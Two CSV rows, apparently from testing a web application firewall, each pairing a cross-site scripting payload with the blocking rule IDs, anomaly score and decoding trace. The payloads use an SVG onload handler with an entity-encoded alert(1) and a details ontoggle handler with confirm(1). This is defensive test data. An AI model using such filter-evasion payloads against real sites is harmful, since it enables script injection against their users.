2156,"<svg onload=""window[Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()]""><svg></svg></svg>",0,1,block,5,"941100,941120,941160,941370,949110","v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,76v217,108t:urlDecodeUni,t:compressWhitespace || ",20,177628947135.899417
2356,"<details open ontoggle=""(function(){return confirm(1)})()""><details ontoggle=""x"">",0,1,block,4,"934100,941100,941120,949110","o25,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628967476.245095
